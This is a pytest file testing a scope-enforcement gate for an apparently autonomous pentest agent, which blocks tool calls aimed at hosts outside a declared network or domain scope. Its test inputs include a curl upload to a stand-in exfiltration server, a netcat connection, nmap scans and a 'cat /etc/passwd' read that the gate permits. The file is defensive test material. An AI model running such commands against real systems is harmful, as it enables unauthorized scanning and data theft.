"""Scope cage — hard target enforcement at the tool-execution layer.

The cage is what makes autonomy safe: declare KRYON_SCOPE and every tool call is
validated against it before running, so the agent physically cannot reach an
unauthorized target (the generalized fix for the prompt-only passive-gate bug).
"""

from __future__ import annotations

import json

import pytest

from kryon.agents.scope_gate import ScopeGate, _classify, get_scope_gate, reset_scope_gate


def _gate(scope: str, deny: str = "") -> ScopeGate:
    rules = [r for r in (_classify(e) for e in scope.split(",")) if r]
    return ScopeGate(rules, [d.strip() for d in deny.split(",") if d.strip()])


def _args(**kw) -> str:
    return json.dumps(kw)


# ---------------------------------------------------------------------------
# Activation (opt-in by declaring scope)
# ---------------------------------------------------------------------------


def test_gate_inactive_without_scope(monkeypatch):
    monkeypatch.delenv("KRYON_SCOPE", raising=False)
    reset_scope_gate()
    assert get_scope_gate() is None
    reset_scope_gate()


def test_gate_active_when_scope_declared(monkeypatch):
    monkeypatch.setenv("KRYON_SCOPE", "10.65.168.0/24")
    reset_scope_gate()
    assert get_scope_gate() is not None
    reset_scope_gate()


# ---------------------------------------------------------------------------
# Structured-target checks
# ---------------------------------------------------------------------------


def test_in_scope_ip_allowed():
    g = _gate("10.65.168.0/24")
    assert g.check_call("nmap_scan", _args(target="10.65.168.5"))[0] is True


def test_out_of_scope_ip_blocked():
    g = _gate("10.65.168.0/24")
    ok, why = g.check_call("nmap_scan", _args(target="8.8.8.8"))
    assert ok is False and "8.8.8.8" in why


def test_wildcard_domain_in_scope():
    g = _gate("*.creative.thm")
    assert g.check_call("web_fetch_smart", _args(url="http://beta.creative.thm/x"))[0] is True
    assert g.check_call("web_fetch_smart", _args(url="http://evil.com/x"))[0] is False


def test_url_prefix_scope():
    g = _gate("https://app.target.com")
    assert g.check_call("web_fetch_smart", _args(url="https://app.target.com/admin"))[0] is True
    assert g.check_call("web_fetch_smart", _args(url="https://other.com/"))[0] is False


def test_localhost_always_allowed():
    g = _gate("10.65.168.0/24")
    assert g.check_call("run_command", _args(command="curl http://127.0.0.1:1337/"))[0] is True
    assert g.check_call("run_command", _args(command="nc localhost 4444"))[0] is True


# ---------------------------------------------------------------------------
# The critical case — target buried in a shell command
# ---------------------------------------------------------------------------


def test_out_of_scope_target_in_run_command_blocked():
    g = _gate("10.65.168.0/24")
    ok, why = g.check_call("run_command", _args(command="nmap -sV 8.8.8.8"))
    assert ok is False and "8.8.8.8" in why


def test_in_scope_target_in_run_command_allowed():
    g = _gate("10.65.168.0/24")
    assert g.check_call("run_command", _args(command="nmap -sV 10.65.168.5"))[0] is True


def test_out_of_scope_domain_in_command_blocked():
    g = _gate("10.65.168.0/24,*.creative.thm")
    ok, why = g.check_call("run_command", _args(command="curl https://exfil-server.net/upload"))
    assert ok is False


# ---------------------------------------------------------------------------
# Non-network ops + deny list
# ---------------------------------------------------------------------------


def test_non_network_op_allowed():
    g = _gate("10.65.168.0/24")
    # a local file read names no external target
    assert g.check_call("run_command", _args(command="cat /etc/passwd"))[0] is True
    assert g.check_call("think", _args(thought="planning next step"))[0] is True


def test_deny_list_hard_blocks_even_if_in_cidr():
    g = _gate("10.65.168.0/24", deny="10.65.168.1")
    ok, why = g.check_call("run_command", _args(command="nmap 10.65.168.1"))
    assert ok is False and "deny" in why.lower()
    # other hosts in the CIDR still allowed
    assert g.check_call("run_command", _args(command="nmap 10.65.168.5"))[0] is True


def test_malformed_args_dont_block():
    g = _gate("10.65.168.0/24")
    assert g.check_call("x", "not json")[0] is True
    assert g.check_call("x", "")[0] is True


# ---------------------------------------------------------------------------
# Classification
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "entry,rtype",
    [
        ("10.0.0.0/24", "cidr"),
        ("10.0.0.5", "ip"),
        ("https://x.com", "url_prefix"),
        ("*.target.com", "domain"),
        ("target.com", "domain"),
    ],
)
def test_classify(entry, rtype):
    r = _classify(entry)
    assert r is not None and r.rule_type == rtype
